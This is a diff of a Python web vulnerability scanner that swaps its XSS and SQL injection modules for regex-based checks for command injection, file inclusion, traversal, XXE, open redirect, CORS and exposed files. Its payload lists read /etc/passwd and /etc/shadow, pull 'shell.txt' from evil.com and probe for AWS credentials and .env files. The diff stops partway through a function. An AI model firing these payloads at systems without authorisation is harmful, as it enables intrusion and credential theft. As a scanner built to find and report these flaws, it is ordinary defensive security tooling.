+                                'title': f'OS Command Injection in parameter: {param_name}',
+                                'description': f'Command injection detected using {technique}',
+                                'url': endpoint,
+                                'confidence': 95,
+                                'tool': 'cmd_injection_scanner',
+                                'poc': f'Parameter: {param_name}\nPayload: {payload}',
+                                'remediation': 'Never pass user input directly to system commands. Use safe APIs',
+                                'raw_data': {'parameter': param_name, 'payload': payload}
+                            })
+                            break
+                        
+                        # Time-based detection
+                        if 'sleep' in payload and elapsed >= 5:
+                            vulnerabilities.append({
+                                'type': 'Command Injection',
+                                'severity': 'critical',
+                                'title': f'Blind Command Injection in parameter: {param_name}',
+                                'description': f'Time-based command injection detected',
+                                'url': endpoint,
+                                'confidence': 80,
+                                'tool': 'cmd_injection_scanner',
+                                'poc': f'Parameter: {param_name}\nPayload: {payload}\nDelay: {elapsed:.2f}s',
+                                'remediation': 'Never pass user input directly to system commands',
+                                'raw_data': {'parameter': param_name, 'payload': payload}
+                            })
+                    except:
+                        continue
+        
+        return vulnerabilities
+    
+    def _scan_file_inclusion(self, scan_id, target, endpoints):
+        """Scan for LFI/RFI vulnerabilities"""
+        vulnerabilities = []
+        
+        lfi_payloads = [
+            '../../../etc/passwd',
+            '../../../../../../etc/passwd',
+            '....//....//....//etc/passwd',
+            '/etc/passwd',
+            '..%2F..%2F..%2Fetc%2Fpasswd',
+            '..%252F..%252F..%252Fetc%252Fpasswd',
+        ]
+        
+        rfi_payloads = [
+            'http://evil.com/shell.txt',
+            '//evil.com/shell.txt',
+        ]
+        
+        lfi_indicators = ['root:', 'daemon:', '/bin/bash', '/bin/sh']
+        
+        test_endpoints = self._discover_parameters(target, endpoints)
+        
+        for endpoint_data in test_endpoints:
+            endpoint = endpoint_data['url']
+            params = endpoint_data.get('params', {})
+            
+            # Look for file/page/include parameters
+            file_params = [p for p in params.keys() if any(keyword in p.lower() 
+                          for keyword in ['file', 'page', 'include', 'path', 'doc', 'document'])]
+            
+            if not file_params:
+                file_params = list(params.keys())[:3]  # Test first 3 params
+            
+            for param_name in file_params:
+                # Test LFI
+                for payload in lfi_payloads:
+                    try:
+                        test_params = params.copy()
+                        test_params[param_name] = payload
+                        
+                        response = self.session.get(endpoint, params=test_params, timeout=10)
+                        
+                        if any(indicator in response.text for indicator in lfi_indicators):
+                            vulnerabilities.append({
+                                'type': 'Local File Inclusion',
+                                'severity': 'critical',
+                                'title': f'LFI in parameter: {param_name}',
+                                'description': f'Local file inclusion allows reading arbitrary files on the server',
+                                'url': endpoint,
+                                'confidence': 95,
+                                'tool': 'lfi_scanner',
+                                'poc': f'Parameter: {param_name}\nPayload: {payload}',
+                                'remediation': 'Use whitelisting for file includes, never allow user input in file paths',
+                                'raw_data': {'parameter': param_name, 'payload': payload}
+                            })
+                            break
+                    except:
+                        continue
+        
+        return vulnerabilities
+    
+    def _scan_directory_traversal_advanced(self, scan_id, target, endpoints):
+        """Enhanced directory traversal detection"""
+        vulnerabilities = []
+        
+        traversal_payloads = [
+            ('../../../etc/passwd', 'Unix password file'),
+            ('..\\..\\..\\windows\\win.ini', 'Windows config'),
+            ('../../../etc/shadow', 'Unix shadow file'),
+            ('..\\..\\..\\ windows\\system32\\drivers\\etc\\hosts', 'Windows hosts'),
+            ('....//....//....//etc/passwd', 'Double encoding'),
+            ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'URL encoding'),
+        ]
+        
+        indicators = {
+            'passwd': ['root:', 'daemon:'],
+            'win.ini': ['[boot loader]', '[fonts]'],
+            'hosts': ['127.0.0.1', 'localhost']
+        }
+        
+        test_endpoints = self._discover_parameters(target, endpoints)
+        
+        for endpoint_data in test_endpoints:
+            endpoint = endpoint_data['url']
+            params = endpoint_data.get('params', {})
+            
+            for param_name in params.keys():
+                for payload, desc in traversal_payloads:
+                    try:
+                        test_params = params.copy()
+                        test_params[param_name] = payload
+                        
+                        response = self.session.get(endpoint, params=test_params, timeout=10)
+                        
+                        # Check for file content indicators
+                        for file_type, file_indicators in indicators.items():
+                            if any(indicator in response.text for indicator in file_indicators):
+                                vulnerabilities.append({
+                                    'type': 'Directory Traversal',
+                                    'severity': 'high',
+                                    'title': f'Directory Traversal in parameter: {param_name}',
+                                    'description': f'Directory traversal allows accessing {desc}',
+                                    'url': endpoint,
+                                    'confidence': 95,
+                                    'tool': 'traversal_scanner',
+                                    'poc': f'Parameter: {param_name}\nPayload: {payload}',
+                                    'remediation': 'Sanitize file paths, use whitelisting',
+                                    'raw_data': {'parameter': param_name, 'payload': payload}
+                                })
+                                break
+                    except:
+                        continue
+        
+        return vulnerabilities
+    
+    def _scan_open_redirect(self, scan_id, target, endpoints):
+        """Scan for open redirect vulnerabilities"""
+        vulnerabilities = []
+        
+        redirect_payloads = [
+            'https://evil.com',
+            '//evil.com',
+            '/\\evil.com',
+            'https:///evil.com',
+        ]
+        
+        test_endpoints = self._discover_parameters(target, endpoints)
+        
+        for endpoint_data in test_endpoints:
+            endpoint = endpoint_data['url']
+            params = endpoint_data.get('params', {})
+            
+            redirect_params = [p for p in params.keys() if any(keyword in p.lower() 
+                              for keyword in ['url', 'redirect', 'return', 'next', 'goto', 'target'])]
+            
+            for param_name in redirect_params:
+                for payload in redirect_payloads:
+                    try:
+                        test_params = params.copy()
+                        test_params[param_name] = payload
+                        
+                        response = self.session.get(endpoint, params=test_params, timeout=10, allow_redirects=False)
+                        
+                        if response.status_code in [301, 302, 303, 307, 308]:
+                            location = response.headers.get('Location', '')
+                            if 'evil.com' in location:
+                                vulnerabilities.append({
+                                    'type': 'Open Redirect',
+                                    'severity': 'medium',
+                                    'title': f'Open Redirect in parameter: {param_name}',
+                                    'description': f'Application redirects to untrusted URLs',
+                                    'url': endpoint,
+                                    'confidence': 95,
+                                    'tool': 'redirect_scanner',
+                                    'poc': f'Parameter: {param_name}\nPayload: {payload}\nRedirects to: {location}',
+                                    'remediation': 'Use whitelisting for redirect URLs',
+                                    'raw_data': {'parameter': param_name, 'payload': payload}
+                                })
+                                break
+                    except:
+                        continue
+        
+        return vulnerabilities
+    
+    def _scan_xxe(self, scan_id, target, endpoints):
+        """Scan for XXE vulnerabilities"""
+        vulnerabilities = []
+        
+        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><name>&xxe;</name></root>'''
+        
+        test_endpoints = self._discover_parameters(target, endpoints)
+        
+        for endpoint_data in test_endpoints:
+            if endpoint_data.get('method') != 'POST':
+                continue
+            
+            endpoint = endpoint_data['url']
             
             try:
-                response = self.session.get(endpoint, timeout=10)
-                soup = BeautifulSoup(response.text, 'html.parser')
+                response = self.session.post(
+                    endpoint,
+                    data=xxe_payload,
+                    headers={'Content-Type': 'application/xml'},
+                    timeout=10
+                )
                 
-                # Extract forms
-                forms = self._extract_forms(endpoint, soup)
-                discovered.extend(forms)
+                if 'root:' in response.text or '/bin/bash' in response.text:
+                    vulnerabilities.append({
+                        'type': 'XXE',
+                        'severity': 'critical',
+                        'title': 'XML External Entity Injection',
+                        'description': 'Application is vulnerable to XXE, allowing file read',
+                        'url': endpoint,
+                        'confidence': 95,
+                        'tool': 'xxe_scanner',
+                        'poc': 'XXE payload successfully read /etc/passwd',
+                        'remediation': 'Disable external entity processing in XML parser',
+                        'raw_data': {}
+                    })
+            except:
+                continue
+        
+        return vulnerabilities
+    
+    def _scan_sensitive_files_advanced(self, scan_id, target):
+        """Enhanced sensitive file detection"""
+        issues = []
+        
+        sensitive_files = [
+            ('/.git/config', 'critical', 'Git configuration'),
+            ('/.git/HEAD', 'critical', 'Git HEAD file'),
+            ('/.env', 'critical', 'Environment variables'),
+            ('/config.php', 'high', 'PHP configuration'),
+            ('/wp-config.php', 'critical', 'WordPress config'),
+            ('/backup.sql', 'critical', 'SQL backup'),
+            ('/database.sql', 'critical', 'Database dump'),
+            ('/.aws/credentials', 'critical', 'AWS credentials'),
+            ('/config.php.bak', 'high', 'Backup file'),
+            ('/web.config', 'medium', 'IIS config'),
+            ('/.htaccess', 'medium', 'Apache config'),
+            ('/phpinfo.php', 'high', 'PHP info page'),
+            ('/README.md', 'low', 'Readme file'),
+            ('/.DS_Store', 'low', 'Mac metadata'),
+            ('/composer.json', 'low', 'PHP dependencies'),
+            ('/package.json', 'low', 'Node dependencies'),
+        ]
+        
+        for file_path, severity, description in sensitive_files:
+            try:
+                test_url = urljoin(target, file_path)
+                response = self.session.get(test_url, timeout=5)
                 
-                # Extract URL parameters from links
-                links = soup.find_all('a', href=True)
-                for link in links:
-                    href = link['href']
-                    full_url = self._normalize_url(target, href)
-                    if full_url and self._same_domain(target, full_url):
-                        parsed = urlparse(full_url)
-                        if parsed.query:
-                            params = parse_qs(parsed.query)
-                            endpoint_data = {
-                                'url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
-                                'method': 'GET',
-                                'params': {k: v[0] if v else '' for k, v in params.items()},
-                                'param_types': self._infer_param_types(params),
-                                'form_fields': []
-                            }
-                            discovered.append(endpoint_data)
-                            # Broadcast endpoint discovery
-                            self.broadcaster.broadcast_endpoint_discovered(scan_id, endpoint_data)
-                            self.broadcaster.broadcast_log(scan_id, f"[Discovery] Found endpoint: {endpoint_data['url']}")
-            except Exception as e:
-                print(f"[Endpoint Discovery] Error processing {endpoint}: {str(e)}")
+                if response.status_code == 200 and len(response.content) > 0:
+                    # Additional verification
+                    content = response.text.lower()
+                    verified = False
+                    
+                    if 'git' in file_path and '[core]' in content:
+                        verified = True
+                    elif file_path.endswith('.sql') and 'insert' in content:
+                        verified = True
+                    elif file_path.endswith('.env') and '=' in content:
+                        verified = True
+                    elif 'phpinfo' in file_path and 'php version' in content:
+                        verified = True
+                    elif response.status_code == 200:
+                        verified = True
+                    
+                    if verified:
+                        issues.append({
+                            'type': 'Sensitive File Exposure',
+                            'severity': severity,
+                            'title': f'Exposed: {description}',
+                            'description': f'{description} ({file_path}) is publicly accessible',
+                            'url': test_url,
+                            'confidence': 100,
+                            'tool': 'file_scanner',
+                            'poc': f'File accessible at: {test_url}\nSize: {len(response.content)} bytes',
+                            'remediation': 'Remove or properly protect sensitive files',
+                            'raw_data': {'file_path': file_path, 'size': len(response.content)}
+                        })
+            except:
+                continue
+        
+        return issues
+    
+    def _scan_backup_files(self, scan_id, target):
+        """Scan for backup files"""
+        vulnerabilities = []
+        
+        # Get base URLs to test
+        parsed = urlparse(target)
+        base_paths = ['/']
+        
+        # Common backup extensions
+        extensions = ['.bak', '.backup', '.old', '.copy', '.orig', '.tmp', '~', '.swp']
+        
+        common_files = ['index', 'config', 'database', 'admin', 'login']
+        common_exts = ['php', 'asp', 'aspx', 'jsp']
+        
+        for filename in common_files:
+            for ext in common_exts:
+                for backup_ext in extensions[:3]:  # Test first 3
+                    test_file = f'/{filename}.{ext}{backup_ext}'
+                    test_url = urljoin(target, test_file)
+                    
+                    try:
+                        response = self.session.get(test_url, timeout=5)
+                        if response.status_code == 200 and len(response.content) > 0:
+                            vulnerabilities.append({
+                                'type': 'Backup File Exposure',
+                                'severity': 'high',
+                                'title': f'Exposed Backup File: {test_file}',
+                                'description': 'Backup file containing source code is accessible',
+                                'url': test_url,
+                                'confidence': 95,
+                                'tool': 'backup_scanner',
+                                'poc': f'File: {test_url}\nSize: {len(response.content)} bytes',
+                                'remediation': 'Remove all backup files from web root',
+                                'raw_data': {}
+                            })
+                    except:
+                        continue
+        
+        return vulnerabilities
+    
+    def _scan_information_disclosure(self, scan_id, target):
+        """Scan for information disclosure issues"""
+        vulnerabilities = []
+        
+        try:
+            # Test for directory listing
+            response = self.session.get(target, timeout=10)
+            
+            if response.status_code == 200:
+                content = response.text.lower()
+                
+                # Check for directory listing
+                if 'index of' in content or '<title>index of /' in content:
+                    vulnerabilities.append({
+                        'type': 'Information Disclosure',
+                        'severity': 'medium',
+                        'title': 'Directory Listing Enabled',
+                        'description': 'Directory listing exposes file structure',
+                        'url': target,
+                        'confidence': 100,
+                        'tool': 'info_disc_scanner',
+                        'poc': 'Directory listing is enabled',
+                        'remediation': 'Disable directory listing in web server config',
+                        'raw_data': {}
+                    })
+                
+                # Check for error messages
+                error_patterns = [
+                    (r'Warning:.*? in .*? on line', 'PHP Warning'),
+                    (r'Fatal error:.*? in .*? on line', 'PHP Fatal Error'),
+                    (r'Stack trace:', 'Stack Trace'),
+                    (r'Database error', 'Database Error'),
+                ]
+                
+                for pattern, error_type in error_patterns:
+                    if re.search(pattern, content, re.IGNORECASE):
+                        vulnerabilities.append({
+                            'type': 'Information Disclosure',
+                            'severity': 'medium',
+                            'title': f'{error_type} Exposed',
+                            'description': f'Application exposes {error_type} with sensitive information',
+                            'url': target,
+                            'confidence': 95,
+                            'tool': 'info_disc_scanner',
+                            'poc': f'Error pattern found: {pattern}',
+                            'remediation': 'Disable error display in production, use error logging instead',
+                            'raw_data': {}
+                        })
+                        break
+        except:
+            pass
+        
+        return vulnerabilities
+    
+    def _check_security_headers(self, scan_id, live_hosts):
+        """Check for missing security headers"""
+        issues = []
+        
+        required_headers = {
+            'X-Frame-Options': ('medium', 'Clickjacking protection missing'),
+            'X-Content-Type-Options': ('low', 'MIME-sniffing protection missing'),
+            'Strict-Transport-Security': ('medium', 'HSTS not implemented'),
+            'Content-Security-Policy': ('medium', 'CSP not implemented'),
+            'X-XSS-Protection': ('low', 'XSS protection header missing'),
+            'Referrer-Policy': ('low', 'Referrer policy not set'),
+        }
+        
+        for host_info in live_hosts[:5]:
+            url = host_info.get('url')
+            try:
+                response = self.session.get(url, timeout=5)
+                
+                for header, (severity, description) in required_headers.items():
+                    if header not in response.headers:
+                        issues.append({
+                            'type': 'Security Misconfiguration',
+                            'severity': severity,
+                            'title': f'Missing Security Header: {header}',
+                            'description': description,
+                            'url': url,
+                            'confidence': 100,
+                            'tool': 'header_scanner',
+                            'poc': f'Header "{header}" not found in response',
+                            'remediation': f'Add the {header} header to all responses',
+                            'raw_data': {'missing_header': header}
+                        })
+            except:
+                continue
+        
+        return issues
+    
+    def _scan_cors(self, scan_id, live_hosts):
+        """Scan for CORS misconfigurations"""
+        issues = []
+        
+        for host_info in live_hosts[:5]:
+            url = host_info.get('url')
+            try:
+                response = self.session.get(
+                    url,
+                    headers={'Origin': 'https://evil.com'},
+                    timeout=5
+                )
+                
+                acao = response.headers.get('Access-Control-Allow-Origin', '')
+                
+                if acao == '*':
+                    issues.append({
+                        'type': 'CORS Misconfiguration',
+                        'severity': 'high',
+                        'title': 'Wildcard CORS Configuration',
+                        'description': 'CORS allows any origin (*), enabling unauthorized access',
+                        'url': url,
+                        'confidence': 100,
+                        'tool': 'cors_scanner',
+                        'poc': f'Access-Control-Allow-Origin: *',
+                        'remediation': 'Configure CORS to only allow trusted origins',
+                        'raw_data': {'acao_header': acao}
+                    })
+                elif acao == 'https://evil.com':
+                    issues.append({
+                        'type': 'CORS Misconfiguration',
+                        'severity': 'high',
+                        'title': 'CORS Reflects Arbitrary Origins',
+                        'description': 'CORS reflects any origin, enabling cross-origin attacks',
+                        'url': url,
+                        'confidence': 100,
+                        'tool': 'cors_scanner',
+                        'poc': f'Origin: https://evil.com reflected in ACAO header',
+                        'remediation': 'Implement origin whitelist validation',
+                        'raw_data': {'acao_header': acao}
+                    })
+            except:
+                continue
+        
+        return issues
+    
+    # Helper methods
+    
+    def _discover_parameters(self, target, endpoints):
+        """Discover all parameters from endpoints and forms"""
+        discovered = []
+        
+        # Test target itself
+        try:
+            response = self.session.get(target, timeout=10)
+            
+            # Find forms
+            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
+            for form in forms:
+                form_data = self._parse_form(form, target)
+                if form_data:
+                    discovered.append(form_data)
+            
+            # Parse URL parameters from links
+            links = re.findall(r'href=["\']([^"\']+)["\']', response.text)
+            for link in links:
+                if '?' in link:
+                    full_url = urljoin(target, link)
+                    parsed = urlparse(full_url)
+                    params = parse_qs(parsed.query)
+                    if params:
+                        discovered.append({
+                            'url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
+                            'params': {k: v[0] if v else '' for k, v in params.items()},
+                            'method': 'GET'
+                        })
+        except:
+            pass
+        
+        # Add endpoints with parameters
+        for endpoint in endpoints[:20]:
+            try:
+                parsed = urlparse(endpoint)
+                params = parse_qs(parsed.query)
+                
+                if params:
+                    discovered.append({
+                        'url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
+                        'params': {k: v[0] if v else '' for k, v in params.items()},
+                        'method': 'GET'
+                    })
+                else:
+                    # Try to discover parameters
+                    response = self.session.get(endpoint, timeout=5)
+                    forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
+                    for form in forms:
+                        form_data = self._parse_form(form, endpoint)
+                        if form_data:
+                            discovered.append(form_data)
+            except:
                 continue
         
         # Deduplicate
         seen = set()
         unique = []
         for item in discovered:
-            key = f"{item['url']}:{item['method']}:{','.join(sorted(item['params'].keys()))}"
+            key = (item['url'], tuple(sorted(item['params'].keys())))
             if key not in seen:
                 seen.add(key)
                 unique.append(item)
         
-        print(f"[Endpoint Discovery] Discovered {len(unique)} testable endpoints")
-        
-        return unique[:200]  # Increased limit to 200 endpoints for deeper scanning
+        return unique[:50]  # Limit to 50
     
-    def _extract_forms(self, base_url, soup):
-        """Extract all forms from page with detailed field information"""
-        forms_data = []
-        forms = soup.find_all('form')
-        
-        for form in forms:
-            # Get form action and method
-            action = form.get('action', '')
-            method = form.get('method', 'GET').upper()
-            action_url = self._normalize_url(base_url, action) if action else base_url
+    def _parse_form(self, form_html, base_url):
+        """Parse HTML form to extract action and inputs"""
+        try:
+            # Get form action
+            action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
+            action = action_match.group(1) if action_match else ''
+            action_url = urljoin(base_url, action) if action else base_url
             
-            # Extract all input fields
+            # Get form method
+            method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
+            method = method_match.group(1).upper() if method_match else 'GET'
+            
+            # Get all inputs
+            inputs = re.findall(r'<input[^>]*>', form_html, re.IGNORECASE)
             params = {}
-            param_types = {}
-            form_fields = []
             
-            inputs = form.find_all(['input', 'textarea', 'select'])
-            for inp in inputs:
-                name = inp.get('name', '')
-                if not name:
-                    continue
+            for input_tag in inputs:
+                name_match = re.search(r'name=["\']([^"\']+)["\']', input_tag, re.IGNORECASE)
+                value_match = re.search(r'value=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
+                type_match = re.search(r'type=["\']([^"\']+)["\']', input_tag, re.IGNORECASE)
                 
-                input_type = inp.get('type', 'text').lower()
-                value = inp.get('value', '')
-                
-                # Skip submit buttons
-                if input_type in ['submit', 'button', 'reset']:
-                    continue
-                
-                # Infer parameter type
-                if input_type == 'email':
-                    params[name] = 'test@example.com'
-                    param_types[name] = 'email'
-                elif input_type == 'number':
-                    params[name] = '123'
-                    param_types[name] = 'number'
-                elif input_type == 'hidden':
-                    params[name] = value
-                    param_types[name] = 'hidden'
-                elif input_type == 'password':
-                    params[name] = 'test123'
-                    param_types[name] = 'password'
-                else:
-                    params[name] = value if value else 'test'
-                    param_types[name] = input_type
-                
-                form_fields.append({
-                    'name': name,
-                    'type': input_type,
-                    'value': value,
-                    'required': inp.has_attr('required')
-                })
+                if name_match:
+                    name = name_match.group(1)
+                    input_type = type_match.group(1).lower() if type_match else 'text'
+                    
+                    # Skip submit buttons
+                    if input_type not in ['submit', 'button', 'reset']:
+                        value = value_match.group(1) if value_match else 'test'
+                        params[name] = value
             
             if params:
-                forms_data.append({
+                return {
                     'url': action_url,
-                    'method': method,
                     'params': params,
-                    'param_types': param_types,
-                    'form_fields': form_fields,
-                    'form_id': form.get('id', ''),
-                    'form_name': form.get('name', '')
-                })
-        
-        return forms_data
-    
-    def _enhanced_xss_scan(self, scan_id, target, endpoints):
-        """
-        Enhanced XSS scanner with multi-context detection
-        Tests: HTML context, JavaScript context, Attribute context
-        """
-        vulnerabilities = []
-        
-        print(f"[XSS Scanner] Testing {len(endpoints)} endpoints...")
-        
-        # Multi-context XSS payloads
-        xss_payloads = [
-            # HTML Context
-            {
-                'payload': '<script>alert(1)</script>',
-                'context': 'HTML',
-                'detection': ['<script>alert(1)</script>'],
-                'severity': 'high'
-            },
-            {
-                'payload': '<img src=x onerror=alert(1)>',
-                'context': 'HTML',
-                'detection': ['<img src=x onerror=alert(1)>', 'onerror=alert(1)'],
-                'severity': 'high'
-            },
-            {
-                'payload': '<svg/onload=alert(1)>',
-                'context': 'HTML',
-                'detection': ['<svg', 'onload=alert(1)'],
-                'severity': 'high'
-            },
-            # Attribute Context
-            {
-                'payload': '" onmouseover="alert(1)',
-                'context': 'Attribute',
-                'detection': ['onmouseover=', 'alert(1)'],
-                'severity': 'high'
-            },
-            {
-                'payload': "' onerror='alert(1)",
-                'context': 'Attribute',
-                'detection': ['onerror=', 'alert(1)'],
-                'severity': 'high'
-            },
-            # JavaScript Context
-            {
-                'payload': '</script><script>alert(1)</script>',
-                'context': 'JavaScript',
-                'detection': ['</script><script>', 'alert(1)'],
-                'severity': 'high'
-            },
-            {
-                'payload': "'-alert(1)-'",
-                'context': 'JavaScript',
-                'detection': ["'-alert(1)-'", 'alert(1)'],
-                'severity': 'high'
-            },
-            # DOM-based XSS payloads
-            {
-                'payload': '#<img src=x onerror=alert(1)>',
-                'context': 'DOM',
-                'detection': ['<img src=x', 'onerror=alert'],
-                'severity': 'high'
-            },
-            {
-                'payload': 'javascript:alert(1)',
-                'context': 'DOM',
-                'detection': ['javascript:alert'],
-                'severity': 'high'
-            },
-            {
-                'payload': '"><svg/onload=confirm(1)>',
-                'context': 'DOM',
-                'detection': ['<svg', 'onload=confirm'],
-                'severity': 'high'
-            },
-            # Additional bypass payloads
-            {
-                'payload': '<iframe src="javascript:alert(1)">',
-                'context': 'HTML',
-                'detection': ['<iframe', 'javascript:alert'],
-                'severity': 'high'
-            },
-            {
-                'payload': '<body onload=alert(1)>',
-                'context': 'HTML',
-                'detection': ['<body', 'onload=alert'],
-                'severity': 'high'
-            },
-            {
-                'payload': '<details open ontoggle=alert(1)>',
-                'context': 'HTML',
-                'detection': ['<details', 'ontoggle=alert'],
-                'severity': 'high'
-            },
-            # Filter bypass
-            {
-                'payload': '<ScRiPt>alert(1)</sCrIpT>',
-                'context': 'HTML',
-                'detection': ['<script>alert', '<ScRiPt>'],
-                'severity': 'high'
-            },
-            {
-                'payload': '<img src=x oNeRrOr=alert(1)>',
-                'context': 'HTML',
-                'detection': ['oNeRrOr', 'alert(1)'],
-                'severity': 'high'
-            }
-        ]
-        
-        for endpoint_data in endpoints[:50]:  # Increased from 30 to 50 endpoints
-            endpoint = endpoint_data['url']
-            params = endpoint_data['params']
-            method = endpoint_data['method']
-            
-            print(f"[XSS Scanner] Testing: {endpoint}")
-            
-            for param_name in list(params.keys())[:10]:  # Increased from 5 to 10 params
-                for payload_data in xss_payloads:  # Test ALL payloads (removed limit)
-                    self.payloads_tested += 1
-                    
-                    try:
-                        test_params = params.copy()
-                        test_params[param_name] = payload_data['payload']
-                        
-                        # Send request
-                        if method == 'POST':
-                            response = self.session.post(endpoint, data=test_params, timeout=10)
-                        else:
-                            response = self.session.get(endpoint, params=test_params, timeout=10)
-                        
-                        # Check if payload is reflected
-                        is_reflected = any(detection in response.text for detection in payload_data['detection'])
-                        
-                        if is_reflected:
-                            # Verify it's exploitable (not encoded)
-                            if self._verify_xss_exploitable(response.text, payload_data['payload']):
-                                # Found XSS! Collect evidence first
-                                evidence = self._collect_http_evidence(
-                                    scan_id, method, endpoint, test_params, response
-                                )
-                                
-                                # Calculate improved confidence score
-                                confidence = self._calculate_confidence_score(
-                                    vuln_type='xss',
-                                    detection_type='reflected',
-                                    technique=payload_data['context'],
-                                    detection_details=f"Payload reflected unencoded in {payload_data['context']} context",
-                                    response_analysis={
-                                        'is_reflected': is_reflected,
-                                        'is_exploitable': True,
-                                        'context': payload_data['context'],
-                                        'payload_complexity': len(payload_data['payload'])
-                                    }
-                                )
-                                
-                                vuln = {
-                                    'type': 'Cross-Site Scripting (XSS)',
-                                    'severity': payload_data['severity'],
-                                    'title': f"XSS in {param_name} ({payload_data['context']} Context)",
-                                    'description': f"The parameter '{param_name}' is vulnerable to {payload_data['context']}-based XSS. "
-                                                 f"User input is reflected in the {payload_data['context']} context without proper encoding, "
-                                                 f"allowing execution of malicious JavaScript code.",
-                                    'url': endpoint,
-                                    'confidence': confidence,
-                                    'confidence_score': confidence,
-                                    'tool': 'enhanced_xss_scanner',
-                                    'detection_tool': 'CyberSage XSS Scanner',
-                                    'affected_parameter': param_name,
-                                    'payload': payload_data['payload'],
-                                    'context': payload_data['context'],
-                                    'poc': self._generate_xss_poc(endpoint, method, param_name, payload_data['payload']),
-                                    'proof_of_concept': self._generate_xss_poc(endpoint, method, param_name, payload_data['payload']),
-                                    'remediation': self._get_xss_remediation(payload_data['context']),
-                                    'cwe_id': 'CWE-79',
-                                    'cve_id': None,
-                                    'cvss_score': 7.1,
-                                    'http_evidence': [evidence],  # Include evidence directly
-                                    'raw_data': json.dumps({
-                                        'parameter': param_name,
-                                        'payload': payload_data['payload'],
-                                        'context': payload_data['context'],
-                                        'method': method,
-                                        'evidence_id': evidence['id'],
-                                        'request': evidence['request_body'],
-                                        'response_code': evidence['response_code']
-                                    })
-                                }
-                                
-                                vulnerabilities.append(vuln)
-                                print(f"[XSS Scanner] ✓ Found XSS in {param_name} ({payload_data['context']})")
-                                break  # Found vuln, no need to test more payloads for this param
-                    
-                    except Exception as e:
-                        continue
-        
-        print(f"[XSS Scanner] Found {len(vulnerabilities)} XSS vulnerabilities")
-        return vulnerabilities
-    
-    def _enhanced_sqli_scan(self, scan_id, target, endpoints):
-        """
-        Enhanced SQL injection scanner with multiple detection techniques
-        """
-        vulnerabilities = []
-        
-        print(f"[SQLi Scanner] Testing {len(endpoints)} endpoints...")
-        
-        # SQL injection payloads with detection techniques
-        sqli_tests = [
-            # Error-based
-            {
-                'payload': "'",
-                'technique': 'Error-based',
-                'detection_type': 'error',
-                'error_patterns': [
-                    r"SQL syntax.*?error",
-                    r"mysql_fetch",
-                    r"mysqli",
-                    r"ORA-\d{5}",
-                    r"PostgreSQL.*?ERROR",
-                    r"SQLSTATE\[\w+\]"
-                ]
-            },
-            {
-                'payload': "' OR '1'='1",
-                'technique': 'Boolean-based',
-                'detection_type': 'differential'
-            },
-            {
-                'payload': "' OR '1'='1' --",
-                'technique': 'Boolean-based (with comment)',
-                'detection_type': 'differential'
-            },
-            {
-                'payload': "1' AND '1'='2",
-                'technique': 'Boolean-based (false)',
-                'detection_type': 'differential'
-            },
-            # Time-based
-            {
-                'payload': "' OR SLEEP(5) --",
-                'technique': 'Time-based blind',
-                'detection_type': 'time',
-                'delay': 5
-            },
-            # UNION-based SQLi (NEW!)
-            {
-                'payload': "' UNION SELECT NULL--",
-                'technique': 'UNION-based',
-                'detection_type': 'union',
-                'union_patterns': [
-                    r'NULL',
-                    r'UNION',
-                    r'The used SELECT statements have a different number of columns'
-                ]
-            },
-            {
-                'payload': "' UNION SELECT NULL,NULL--",
-                'technique': 'UNION-based (2 columns)',
-                'detection_type': 'union',
-                'union_patterns': [r'NULL']
-            },
-            {
-                'payload': "' UNION SELECT NULL,NULL,NULL--",
-                'technique': 'UNION-based (3 columns)',
-                'detection_type': 'union',
-                'union_patterns': [r'NULL']
-            },
-            {
-                'payload': "' UNION SELECT 1,2,3--",
-                'technique': 'UNION-based (numeric)',
-                'detection_type': 'union',
-                'union_patterns': [r'[123]']
-            },
-            {
-                'payload': "' UNION SELECT table_name FROM information_schema.tables--",
-                'technique': 'UNION-based (information schema)',
-                'detection_type': 'union',
-                'union_patterns': [r'table_name', r'information_schema']
-            },
-            {
-                'payload': "' UNION ALL SELECT NULL,NULL,NULL--",
-                'technique': 'UNION ALL-based',
-                'detection_type': 'union',
-                'union_patterns': [r'NULL']
-            },
-            # ORDER BY technique for column enumeration
-            {
-                'payload': "' ORDER BY 1--",
-                'technique': 'ORDER BY column enumeration',
-                'detection_type': 'differential'
-            },
-            {
-                'payload': "' ORDER BY 10--",
-                'technique': 'ORDER BY column enumeration (high)',
-                'detection_type': 'error',
-                'error_patterns': [
-                    r"Unknown column",
-                    r"ORDER BY position",
-                    r"invalid ORDER BY"
-                ]
-            }
-        ]
-        
-        for endpoint_data in endpoints[:30]:
-            endpoint = endpoint_data['url']
-            params = endpoint_data['params']
-            method = endpoint_data['method']
-            
-            print(f"[SQLi Scanner] Testing: {endpoint}")
-            
-            # Get baseline response
-            try:
-                if method == 'POST':
-                    baseline = self.session.post(endpoint, data=params, timeout=10)
-                else:
-                    baseline = self.session.get(endpoint, params=params, timeout=10)
-                baseline_length = len(baseline.text)
-                baseline_time = baseline.elapsed.total_seconds()
-            except:
-                continue
-            
-            for param_name in list(params.keys())[:10]:  # Increased from 5 to 10 params
-                for test in sqli_tests:  # Test ALL techniques (removed limit)
-                    self.payloads_tested += 1
-                    
-                    try:
-                        test_params = params.copy()
-                        test_params[param_name] = test['payload']
-                        
-                        start_time = time.time()
-                        
-                        if method == 'POST':
-                            response = self.session.post(endpoint, data=test_params, timeout=15)
-                        else:
-                            response = self.session.get(endpoint, params=test_params, timeout=15)
-                        
-                        elapsed = time.time() - start_time
-                        
-                        # Check detection type
-                        is_vulnerable = False
-                        detection_details = ""
-                        
-                        if test['detection_type'] == 'error':
-                            # Error-based detection
-                            for pattern in test.get('error_patterns', []):
-                                if re.search(pattern, response.text, re.IGNORECASE):
-                                    is_vulnerable = True
-                                    detection_details = f"SQL error pattern detected: {pattern}"
-                                    break
-                        
-                        elif test['detection_type'] == 'differential':
-                            # Boolean-based detection (response length difference)
